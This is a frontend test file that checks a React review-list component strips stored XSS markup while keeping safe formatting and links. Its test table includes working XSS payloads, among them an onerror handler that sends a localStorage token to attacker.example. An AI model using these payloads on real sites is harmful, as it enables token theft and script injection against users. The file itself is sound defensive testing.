import { render } from '@testing-library/react';
import ReviewList from '../../client/src/components/ReviewList';

function renderBody(body) {
  return render(<ReviewList reviews={[{ _id: 'r1', rating: 5, body }]} />).container;
}

describe('stored review XSS regression coverage', () => {
  test.each([
    ['Flow alert', '<img src=x onerror="alert(\'XSS — your token: \' + localStorage.getItem(\'token\'))">'],
    ['Flow exfiltration', '<img src=x onerror="fetch(\'https://attacker.example/steal?t=\' + localStorage.getItem(\'token\'))">'],
    ['script element', '<script>alert(1)</script>'],
    ['SVG onload', '<svg onload="alert(1)"></svg>'],
    ['link handler', '<a href="https://example.com" onclick="alert(1)">link</a>'],
    ['javascript URL', '<a href="javascript:alert(1)">link</a>'],
    ['encoded javascript URL', '<a href="jav&#x61;script:alert(1)">link</a>']
  ])('removes active markup: %s', (_name, payload) => {
    const container = renderBody(`Safe text ${payload}`);
    const review = container.querySelector('.review-body');
    expect(review).toHaveTextContent('Safe text');
    expect(review.querySelector('script, img, svg, iframe, object')).toBeNull();
    for (const element of review.querySelectorAll('*')) {
      for (const attribute of element.attributes) {
        expect(attribute.name).not.toMatch(/^on/i);
      }
    }
    const link = review.querySelector('a');
    if (link) expect(link.getAttribute('href') || '').not.toMatch(/^javascript:/i);
  });

  test('preserves formatting and safe links without interpreting text entities as markup', () => {
    const container = renderBody(
      '<p><b>Great</b> <strong>seller</strong><br><em>Fast</em> <i>shipping</i>.</p>' +
      '<ul><li>Recommended</li></ul>' +
      '<a href="https://example.com/item" title="Item">details</a>' +
      '&lt;script&gt;literal text&lt;/script&gt;'
    );
    expect(container.querySelector('b')).toHaveTextContent('Great');
    expect(container.querySelector('strong')).toHaveTextContent('seller');
    expect(container.querySelector('br')).not.toBeNull();
    expect(container.querySelector('em')).toHaveTextContent('Fast');
    expect(container.querySelector('i')).toHaveTextContent('shipping');
    expect(container.querySelector('li')).toHaveTextContent('Recommended');
    expect(container.querySelector('a')).toHaveAttribute('href', 'https://example.com/item');
    expect(container.querySelector('a')).toHaveAttribute('title', 'Item');
    expect(container).toHaveTextContent('<script>literal text</script>');
    expect(container.querySelector('script')).toBeNull();
  });
});
